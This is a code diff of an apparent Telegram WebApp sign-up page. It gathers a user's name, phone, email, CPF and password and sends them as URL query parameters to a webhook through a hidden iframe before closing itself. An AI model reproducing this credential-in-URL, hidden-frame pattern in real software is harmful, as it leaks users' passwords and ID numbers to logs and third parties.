@@ -25,7 +25,7 @@
   <button id="btnEnviar" class="btn" onclick="enviar()">CONCLUIR</button>
 </div>
 
-<iframe name="janela-invisivel" id="iframe-oculto"></iframe>
+<iframe name="hidden_iframe" id="iframe-oculto"></iframe>
 
 <script>
   const tg = window.Telegram?.WebApp;
@@ -42,7 +42,8 @@
       telefone: document.getElementById('telefone').value,
       email: document.getElementById('email').value,
       cpf: document.getElementById('cpf').value,
-      senha: document.getElementById('senha').value
+      senha: document.getElementById('senha').value,
+      _t: Date.now() // Evita cache
     };
 
     if (!dados.nome || !dados.senha) {
@@ -50,25 +51,34 @@
       return;
     }
 
-    // Muda o botão para dar feedback
+    // 1. Feedback Visual
     btn.disabled = true;
     btn.innerText = "PRONTO!";
 
-    // Monta a URL e "atira" para o iframe invisível
+    // 2. DISPARO "FIRE AND FORGET"
+    // Abrimos a URL no iframe. O navegador entende como uma navegação isolada e não trava o script principal.
     const query = new URLSearchParams(dados).toString();
-    window.open(`${webhookUrl}?${query}`, 'janela-invisivel');
+    window.open(`${webhookUrl}?${query}`, 'hidden_iframe');
 
-    // Mostra o alerta e fecha o app imediatamente
+    // 3. FECHAMENTO IMEDIATO
+    // Esperamos apenas 300ms (tempo do clique) e executamos o alerta/fechamento
     setTimeout(() => {
       if (tg && tg.showAlert) {
+        // Se estiver no Telegram
         tg.showAlert("✅ Cadastro realizado!", () => {
           tg.close();
         });
       } else {
-        alert("✅ Cadastro realizado com sucesso!");
-        btn.innerText = "CONCLUÍDO";
+        // Se estiver no Chrome
+        alert("✅ Cadastro realizado!");
+        
+        // Tenta fechar. Se o Chrome bloquear, ele manda para o bot.
+        window.close();
+        setTimeout(() => {
+          window.location.href = "https://t.me/SEU_BOT_NOME"; // Coloque o link do seu bot aqui
+        }, 100);
       }
-    }, 500); // Meio segundo é o suficiente para o disparo
+    }, 300);
   }
 </script>
 </body>
